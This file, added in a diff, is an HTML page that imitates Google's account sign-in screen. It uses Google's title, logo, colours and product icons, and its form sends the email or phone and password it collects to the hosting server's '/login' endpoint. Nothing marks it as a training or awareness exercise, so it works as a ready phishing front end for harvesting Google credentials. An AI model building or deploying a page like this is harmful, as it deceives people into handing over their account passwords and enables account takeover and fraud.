@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+        }
+
+        body {
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-container {
+            width: 448px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            height: 24px;
+        }
+
+        h1 {
+            color: #202124;
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .subtitle {
+            color: #202124;
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: 0.1px;
+            line-height: 1.5;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        input {
+            width: 100%;
+            height: 56px;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            border: 2px solid #1a73e8;
+        }
+
+        .forgot-email {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            letter-spacing: 0.25px;
+            text-decoration: none;
+            margin: 8px 0;
+        }
+
+        .forgot-email:hover {
+            background: rgba(26,115,232,0.04);
+        }
+
+        .helper-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 16px 0;
+        }
+
+        .helper-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .helper-text a:hover {
+            background: rgba(26,115,232,0.04);
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            letter-spacing: 0.25px;
+            text-decoration: none;
+        }
+
+        .create-account:hover {
+            background: rgba(26,115,232,0.04);
+        }
+
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            height: 36px;
+            padding: 0 24px;
+            cursor: pointer;
+            letter-spacing: 0.25px;
+        }
+
+        .next-button:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3),0 1px 3px 1px rgba(66,133,244,0.15);
+        }
+
+        .google-apps {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-top: 32px;
+            justify-content: center;
+        }
+
+        .app-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f8f9fa;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .app-icon:hover {
+            background: #f1f3f4;
+        }
+
+        .app-icon img {
+            width: 24px;
+            height: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" height="24">
+        </div>
+        <h1>Choose an account</h1>
+        <p class="subtitle">to continue to Google services</p>
+
+        <form method="POST" action="/login">
+            <div class="input-container">
+                <input type="text" name="username" placeholder="Email or phone" required>
+            </div>
+            <div class="input-container">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+
+            <div class="button-container">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-button">Next</button>
+            </div>
+        </form>
+
+        <div class="google-apps">
+            <div class="app-icon">
+                <img src="https://www.gstatic.com/images/branding/product/1x/gmail_48dp.png" alt="Gmail">
+            </div>
+            <div class="app-icon">
+                <img src="https://www.gstatic.com/images/branding/product/1x/drive_48dp.png" alt="Drive">
+            </div>
+            <div class="app-icon">
+                <img src="https://www.gstatic.com/images/branding/product/1x/docs_48dp.png" alt="Docs">
+            </div>
+            <div class="app-icon">
+                <img src="https://www.gstatic.com/images/branding/product/1x/meet_48dp.png" alt="Meet">
+            </div>
+        </div>
+    </div>
+</body>
+</html>
